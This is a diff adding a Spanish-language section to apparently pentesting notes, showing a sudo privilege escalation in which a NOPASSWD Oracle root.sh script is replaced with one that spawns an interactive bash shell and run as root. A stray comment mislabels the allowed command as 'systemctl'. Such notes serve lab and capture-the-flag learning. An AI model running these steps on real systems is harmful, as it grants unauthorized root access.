@@ -215,3 +215,26 @@ Paso 5:
 Paso 6: 
 ❯ umount /tmp/nfs        # Al finalizar desmontar el directorio   
 ```
+
+### Root.sh 
+```bash 
+❯ sudo -l       
+# Ejecutar el comando 'systemctl' como root sin password
+	(ALL) NOPASSWD: /opt/oracle/product/21c/dbhomeXE/root.sh 
+
+Paso 1:
+❯ ls -lah /opt/oracle/product/21c
+❯ rm /opt/oracle/product/21c/dbhomeXE/root.sh
+
+Paso 2:
+❯ vi /opt/oracle/product/21c/dbhomeXE/root.sh
+
+	#!/bin/bash
+	/bin/bash -i
+
+Paso 3:
+❯ chmod +x /opt/oracle/product/21c/dbhomeXE/root.sh    # Dar permisos de ejecución 
+
+Paso 4:
+❯ sudo /opt/oracle/product/21c/dbhomeXE/root.sh        # Ejecutar y ser root
+```
